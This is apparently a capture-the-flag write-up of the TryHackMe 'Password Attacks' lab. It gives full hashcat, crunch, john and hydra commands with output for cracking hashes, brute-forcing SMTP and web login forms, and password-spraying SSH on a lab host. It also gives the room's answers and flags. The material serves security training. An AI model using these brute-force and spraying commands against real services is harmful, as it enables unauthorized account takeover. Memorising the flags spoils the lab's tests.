---
title: Password Attacks
author: CYB3RM3
name: CYB3RM3 | Password Attacks
date: 2022-04-16 12:58:26 +0100
categories: [TryHackMe, RedTeam]
tags: [Red Team, Password Attack]
---

This room introduces the fundamental techniques to perform a successful password attack against various services and scenarios.

THM Room [https://tryhackme.com/room/passwordattacks](https://tryhackme.com/room/passwordattacks)


## TASK 1 : Introduction
### Learn about password attacking techniques in the next task! 
No Answer

## TASK 2 : Password Attacking Techniques
### Which type of password attack is performed locally? 
Answer : Password cracking

## TASK 3 : Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists
###  What is the Juniper Networks ISG 2000 default password? 
Going to DefaultPassword <https://default-password.info/>, I found the ISG2000 default password in the Juniper devices section :

![ISG2000](/images/thm/passwordattacks/passwordattacks_1.png)
_ISG2000_

![ISG2000 default credentials](/images/thm/passwordattacks/passwordattacks_2.png)
_ISG2000 default credentials_

Answer : netscreen:netscreen

## TASK 4 : Password Profiling #2 - Keyspace Technique and CUPP
### Run the following crunch command:crunch 2 2 01234abcd -o crunch.txt. How many words did crunch generate? 
I tried to run crunch on the Kali machine, but it was not installed, so i quickly install it first :

![Crunch install](/images/thm/passwordattacks/passwordattacks_3.png)
_Crunch install_

Then i run the command :
```console
 crunch 2 2 01234abcd -o crunch.txt
 ```
{: .nolineno }

![crunch](/images/thm/passwordattacks/passwordattacks_4.png)
_crunch_

And i got the number of lines generated.

Answer : 81

### What is the crunch command to generate a list containing THM@! and output to a filed named tryhackme.txt?

Reading the man page of crunch : "man crunch", i saw that pattern could be specified by "-t" :

![crunch](/images/thm/passwordattacks/passwordattacks_5.png)
_crunch_

And we need to generate word of 5 charachers and output "tryhackme.txt"

Answer : 
```console
crunch 5 5 -t "THM^^" -o tryhackme.txt
```
{: .nolineno }

## TASK 5 : Offline Attacks - Dictionary and Brute-Force
### Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the hash type?
Using the command "hashid" to identify the hash type :

![hashid install](/images/thm/passwordattacks/passwordattacks_6.png)
_hashid install_

Answer : sha-1

### Perform a dictionary attack against the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the cracked value? Use rockyou.txt wordlist.

Then i used the hashcat commant to crack the hash value with the mode for SHA-1 <https://hashcat.net/wiki/doku.php?id=hashcat>:

![hashcat mode](/images/thm/passwordattacks/passwordattacks_7.png)
_hashcat mode_

```console
hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt



root@ip-10-10-226-237:~/Desktop/test# hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txthashcat (v6.1.1-66-g6a419d06) starting...

* Device #2: Outdated POCL OpenCL driver detected!

This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
You can use --force to override this, but do not report related errors.

OpenCL API (OpenCL 2.0 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, 3878/3942 MB (985 MB allocatable), 2MCU

OpenCL API (OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.0, SPIR, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
===========================================================================================================================
* Device #2: pthread-Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 9 secs

8d6e34f987851aa599257d3831a1af040886842f:sunshine

Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA1
Hash.Target......: 8d6e34f987851aa599257d3831a1af040886842f
Time.Started.....: Sat Apr 16 11:04:01 2022 (0 secs)
Time.Estimated...: Sat Apr 16 11:04:01 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1373.9 kH/s (0.49ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2048/14344384 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> lovers1

Started: Sat Apr 16 11:03:11 2022
Stopped: Sat Apr 16 11:04:03 2022
```
{: .nolineno }

Then using the "--show" option to print the result :

```console
root@ip-10-10-226-237:~/Desktop/test# hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt --show
8d6e34f987851aa599257d3831a1af040886842f:sunshine
```
{: .nolineno }

Answer : sunshine

### Perform a brute-force attack against the following MD5 hash: e48e13207341b6bffb7fb1622282247b. What is the cracked value? Note the password is a 4 digit number: [0-9][0-9][0-9][0-9]

First i set the hash in a file :

```console
echo "e48e13207341b6bffb7fb1622282247b" > hash2.txt
```
{: .nolineno }

Then i run hashcat with parameter for brute forcing "-a 3" with our file and the four digit number is represented by "?d?d?d?d" :

```console
root@ip-10-10-226-237:~/Desktop/test# hashcat -a 3 hash2.txt ?d?d?d?d 
hashcat (v6.1.1-66-g6a419d06) starting...

* Device #2: Outdated POCL OpenCL driver detected!

This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
You can use --force to override this, but do not report related errors.

OpenCL API (OpenCL 2.0 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, 3878/3942 MB (985 MB allocatable), 2MCU

OpenCL API (OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.0, SPIR, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
===========================================================================================================================
* Device #2: pthread-Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

e48e13207341b6bffb7fb1622282247b:1337            
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: e48e13207341b6bffb7fb1622282247b
Time.Started.....: Sat Apr 16 11:07:29 2022 (0 secs)
Time.Estimated...: Sat Apr 16 11:07:29 2022 (0 secs)
Guess.Mask.......: ?d?d?d?d [4]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7970.8 kH/s (0.57ms) @ Accel:1024 Loops:10 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10000/10000 (100.00%)
Rejected.........: 0/10000 (0.00%)
Restore.Point....: 0/1000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-10 Iteration:0-10
Candidates.#1....: 1234 -> 6764

Started: Sat Apr 16 11:07:10 2022
Stopped: Sat Apr 16 11:07:30 2022

```
{: .nolineno }

Answer : 1337

## TASK 6 : Offline Attacks - Rule-Based

### What would the syntax you would use to create a rule to produce the following: "S[Word]NN  where N is Number and S is a symbol of !@? 
From the task :

![Syntax](/images/thm/passwordattacks/passwordattacks_8.png)
_Syntax_

So we need a word, beginning with a symbol "!@" following by 2 numbers.

Answer : 

```console
Az"[0-9][0-9]" ^[!@]
```
{: .nolineno }

## TASK 7 : Deploy the VM
### Get your pentest weapons ready to attack MACHINE_IP.
No Answer.

## TASK 8 : Online password attacks
### Can you guess the FTP credentials without brute-forcing? What is the flag?
Sometimes "Anonymous" login is not deactivate from FTP access :

```console
root@ip-10-10-226-237:~/Desktop/test# ftp 10.10.129.191
Connected to 10.10.129.191.
220 (vsFTPd 3.0.3)
Name (10.10.129.191:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 111      116          4096 Oct 12  2021 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              38 Oct 12  2021 flag.txt
226 Directory send OK.
ftp> cat flag.txt
?Invalid command
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (38 bytes).
226 Transfer complete.
38 bytes received in 0.00 secs (21.0251 kB/s)
ftp> 
```
{: .nolineno }

Switching back out the FTP :

```console
root@ip-10-10-226-237:~/Desktop/test# ls
clinic.lst  crunch.txt  cupp  flag.txt  hash1.txt  hash2.txt  ip.txt
root@ip-10-10-226-237:~/Desktop/test# cat flag.txt 
THM{d0abe799f25738ad739c20301aed357b}
```
{: .nolineno }

Answer : THM{d0abe799f25738ad739c20301aed357b}

### In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against 10.10.129.191:25 (SMTP). What is the password? Note that the password format is as follows: [symbol][dictionary word][0-9][0-9].

Adding our rule to john.conf file :

![john.conf](/images/thm/passwordattacks/passwordattacks_9.png)
_john.conf_

Then generate the dictioary wordlist from clinic one :

```console
root@ip-10-10-226-237:~/Desktop/test# john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > dict.lst
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
21000p 0:00:00:00 100.00% (2022-04-16 11:36) 525000p/s @ultricies99
```
{: .nolineno }

We can now run our SMTP attack :

```console
root@ip-10-10-226-237:~/Desktop/test# hydra -l pittman@clinic.thmredteam.com -P dict.lst smtp://10.10.129.191:25 -v
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-04-16 11:37:27
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21000 login tries (l:1/p:21000), ~1313 tries per task
[DATA] attacking smtp://10.10.129.191:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.129.191   login: pittman@clinic.thmredteam.com   password: !multidisciplinary00
[STATUS] attack finished for 10.10.129.191 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-04-16 11:37:46
```
{: .nolineno }

Answer : !multidisciplinary00

### Perform a brute-forcing attack against the phillips account for the login page at http://10.10.129.191/login-get using hydra? What is the flag?

Using hydra again the connection form :

```console
root@ip-10-10-226-237:~/Desktop/test# hydra -l phillips -P clinic.txt 10.10.129.191 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-04-16 11:47:45
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 105 login tries (l:1/p:105), ~7 tries per task
[DATA] attacking http-get-form://10.10.129.191:80//login-get/index.php:username=^USER^&password=^PASS^:S=logout.php
[80][http-get-form] host: 10.10.129.191   login: phillips   password: Paracetamol
[STATUS] attack finished for 10.10.129.191 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-04-16 11:47:56
```
{: .nolineno }

Then log in to the form http://10.10.129.191/login-get with the credentials :

![Flag](/images/thm/passwordattacks/passwordattacks_10.png)
_Flag_

Answer : THM{33c5d4954da881814420f3ba39772644}

### Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://10.10.129.191/login-post/. What is the flag? Note: use the clinic.lst dictionary in generating and expanding the wordlist!
Using joh Single-extra rule to expand out clinic.lst wordlist :

```console
root@ip-10-10-226-237:~/Desktop/test# john --wordlist=clinic.lst --rules=Single-Extra --stdout > dict2.lst
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
537026p 0:00:00:00 100.00% (2022-04-16 11:51) 4882Kp/s multidisciplina
```
{: .nolineno }

Then use this new wordlist in our attack :

```console
root@ip-10-10-226-237:~/Desktop/test# hydra -l burgess -P dict2.lst 10.10.129.191 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-04-16 11:54:18
[DATA] max 16 tasks per 1 server, overall 16 tasks, 537026 login tries (l:1/p:537026), ~33565 tries per task
[DATA] attacking http-post-form://10.10.129.191:80//login-post/index.php:username=^USER^&password=^PASS^:S=logout.php
[STATUS] 1184.00 tries/min, 1184 tries in 00:01h, 535842 to do in 07:33h, 16 active
[80][http-post-form] host: 10.10.129.191   login: burgess   password: OxytocinnicotyxO
[STATUS] attack finished for 10.10.129.191 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-04-16 11:56:00
```
{: .nolineno }

Then log in with burgess password :

![Flag 2](/images/thm/passwordattacks/passwordattacks_11.png)
_Flag 2_

Answer : THM{f8e3750cc0ccbb863f2706a3b2933227}

## TASK 9 : Password spray attack
### Perform a password spraying attack to get access to the SSH://10.10.129.191 server to read /etc/flag. What is the flag?

Creating the usernames-list.txt file then trying different possibilities  but none works :

```console
root@ip-10-10-226-237:~/Desktop/test# hydra -L usernames-list.txt -p Summer2021@ ssh://10.10.129.191
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-04-16 12:04:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://10.10.129.191:22/
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-04-16 12:04:09
root@ip-10-10-226-237:~/Desktop/test# hydra -L usernames-list.txt -p Summer2021! ssh://10.10.129.191
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-04-16 12:04:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://10.10.129.191:22/
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-04-16 12:04:15
root@ip-10-10-226-237:~/Desktop/test# hydra -L usernames-list.txt -p Autumn2021! ssh://10.10.129.191
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-04-16 12:04:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://10.10.129.191:22/
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-04-16 12:04:23
root@ip-10-10-226-237:~/Desktop/test# hydra -L usernames-list.txt -p Autumn2021@ ssh://10.10.129.191
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-04-16 12:04:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://10.10.129.191:22/
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-04-16 12:04:30
root@ip-10-10-226-237:~/Desktop/test# hydra -L usernames-list.txt -p Winter2021@ ssh://10.10.129.191
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-04-16 12:04:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://10.10.129.191:22/
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-04-16 12:04:45
```
{: .nolineno }

Then finally :

```console
root@ip-10-10-226-237:~/Desktop/test# hydra -L usernames-list.txt -p Fall2021@ ssh://10.10.129.191
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-04-16 12:07:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://10.10.129.191:22/
[22][ssh] host: 10.10.129.191   login: burgess   password: Fall2021@
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-04-16 12:07:16
```
{: .nolineno }

Connecting to Burgess SSH :

```console
root@ip-10-10-226-237:~/Desktop/test# ssh burgess@10.10.129.191
The authenticity of host '10.10.129.191 (10.10.129.191)' can't be established.
ECDSA key fingerprint is SHA256:7S4Su1KM0oJvJDNQTDVYtgsApIoibze7gZhucnImSf8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.129.191' (ECDSA) to the list of known hosts.
burgess@10.10.129.191's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1058-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Apr 16 11:09:19 UTC 2022

  System load:                    0.04
  Usage of /:                     21.1% of 19.32GB
  Memory usage:                   37%
  Swap usage:                     0%
  Processes:                      146
  Users logged in:                0
  IP address for eth0:            10.10.129.191
  IP address for docker0:         172.17.0.1
  IP address for br-c0dd1805e8c7: 172.18.0.1
  IP address for br-mailcow:      172.22.1.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

61 packages can be updated.
8 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Nov 16 09:49:44 2021 from 10.8.232.37
burgess@ip-10-10-129-191:~$
```
{: .nolineno }

Then retreiving the flag :

```console
burgess@ip-10-10-129-191:/$ cat /etc/flag
THM{a97a26e86d09388bbea148f4b870277d}
```
{: .nolineno }

Answer : THM{a97a26e86d09388bbea148f4b870277d}

## TASK 10 : Summary 
### Hope you enjoyed the room and keep learning! 

No Answer.